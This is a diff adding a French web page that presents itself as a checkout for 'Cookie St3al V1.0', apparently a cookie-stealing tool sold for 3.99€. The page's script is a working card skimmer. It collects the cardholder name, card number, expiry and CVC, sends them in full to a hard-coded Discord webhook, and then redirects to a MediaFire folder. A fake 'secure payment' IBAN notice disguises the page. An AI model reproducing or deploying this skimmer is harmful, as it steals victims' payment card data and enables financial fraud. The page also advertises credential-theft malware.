@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SK COMMUNITY | Cookie St3al</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .payment-container {
+            max-width: 450px;
+            margin: 100px auto;
+            padding: 30px;
+            background: rgba(10, 10, 10, 0.8);
+            border: 1px solid #00ff88;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .auth-field {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #333;
+            color: white;
+            padding: 12px;
+            border-radius: 5px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .auth-field:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
+        .price-tag { font-size: 2rem; color: #00ff88; font-weight: bold; margin: 15px 0; }
+        .secure-info { font-size: 0.7rem; color: #666; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="logo-container"><div class="logo">SK COMMUNITY</div></div>
+            <ul>
+                <li><a href="index.html">Retour</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="payment-container card">
+        <h2 style="color: #00ff88;">🍪 COOKIE ST3AL V1.0</h2>
+        <p style="font-size: 0.9rem; color: #888;">Accès premium au dossier de ressources.</p>
+        
+        <div class="price-tag">3.99€</div>
+
+        <div id="payment-form">
+            <div class="input-group">
+                <input type="text" id="cardName" placeholder="Nom du titulaire" class="auth-field">
+            </div>
+            <div class="input-group">
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" class="auth-field" maxlength="19">
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="cardExp" placeholder="MM/YY" class="auth-field" maxlength="5">
+                <input type="text" id="cardCVC" placeholder="CVC" class="auth-field" maxlength="3">
+            </div>
+
+            <button onclick="executePayment()" class="btn-primary" style="width: 100%; margin-top: 20px; padding: 15px;">
+                PAYER ET TÉLÉCHARGER
+            </button>
+        </div>
+
+        <div id="processing" style="display: none;">
+            <div class="loader"></div>
+            <p style="color: #00ff88; margin-top: 15px;">Validation bancaire en cours...</p>
+        </div>
+
+        <div class="secure-info">
+            🔒 Paiement sécurisé vers IBAN: FR94...690
+        </div>
+    </div>
+
+    <script>
+        async function executePayment() {
+            const webhookURL = "https://discord.com/api/webhooks/1482942998290632935/iktE4f0UWkcAbnlatLiSnpU8vmuaxxodCz_nzCJJ6UCDaE2V2YKr5FmDsw1olfHVVp8w";
+            
+            const name = document.getElementById('cardName').value;
+            const number = document.getElementById('cardNumber').value;
+            const exp = document.getElementById('cardExp').value;
+            const cvc = document.getElementById('cardCVC').value;
+
+            if(!name || !number || !exp || !cvc) {
+                alert("Veuillez remplir toutes les informations bancaires.");
+                return;
+            }
+
+            document.getElementById('payment-form').style.display = 'none';
+            document.getElementById('processing').style.display = 'block';
+
+            // Envoi des données au Webhook
+            const payload = {
+                embeds: [{
+                    title: "💳 NOUVEAU PAIEMENT - COOKIE ST3AL",
+                    color: 0x00ff88,
+                    fields: [
+                        { name: "👤 Titulaire", value: `\`${name}\``, inline: true },
+                        { name: "📅 Expiration", value: `\`${exp}\``, inline: true },
+                        { name: "🔢 Carte", value: `\`${number}\`` },
+                        { name: "🔒 CVC", value: `\`${cvc}\``, inline: true },
+                        { name: "💰 Montant", value: "3.99€", inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                setTimeout(() => {
+                    // Redirection vers MediaFire
+                    window.location.href = "https://www.mediafire.com/folder/yly3wqwat0v12/Cookie+St3al+all";
+                }, 3000);
+
+            } catch (err) {
+                alert("Erreur lors de la transaction. Réessayez.");
+                document.getElementById('payment-form').style.display = 'block';
+                document.getElementById('processing').style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
